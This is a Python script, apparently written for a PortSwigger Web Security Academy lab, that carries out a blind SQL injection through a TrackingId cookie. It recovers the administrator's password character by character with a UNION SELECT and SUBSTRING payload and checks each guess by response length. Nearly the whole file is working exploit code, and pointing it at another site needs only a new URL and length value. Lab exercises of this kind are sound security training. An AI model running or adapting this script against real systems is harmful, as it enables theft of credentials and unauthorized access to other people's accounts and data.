#!/usr/bin/python3

"""
	Variable(s) that are required to change:
		- url, resp_text_len
		
	Variables that you may need to be modified: 
		- pass_length, payload
"""

import requests
import sys 


def main(args):

	pass_length = 20
	chars = '0123456789abcdefghijklmnopqrstuvwxyz'
	url = "https://ac051f851eaa0a4680b40a9a00f400b2.web-security-academy.net/filter?category=Gifts" # You MUST change this!
	passwd = ""
	resp_text_len = 7037 # You MUST change this!
	
	for i in range(1, pass_length + 1): 
		for c in chars: 
			# This is the correct payload
			payload = f"x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+SUBSTRING(password,{i},1)='{c}'--"
			
			# THIS PAYLOAD IS FOR TESTING PURPOSES!! THIS ALWAYS RETURN TRUE
			# Uncomment this to test and always get the correct result
			# payload = f"x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+SUBSTRING(password,1,1)>='0'--"
			 
			print("Trying payload:", payload)
			r = requests.get(url, headers={'Cookie': f"TrackingId={payload}"} )
			
			# Always check length of the result!
			# Uncomment then replace the 'resp_text_len' variable to get correct password char.
			# print(len(r.text))

			if len(r.text) == resp_text_len:
				print(f'[+] Password char found: {c}')
				passwd += c
				break
	print(f'The password for administrator is: {passwd}')
	
	
if __name__ == '__main__':
	main(sys.argv[1:])
	

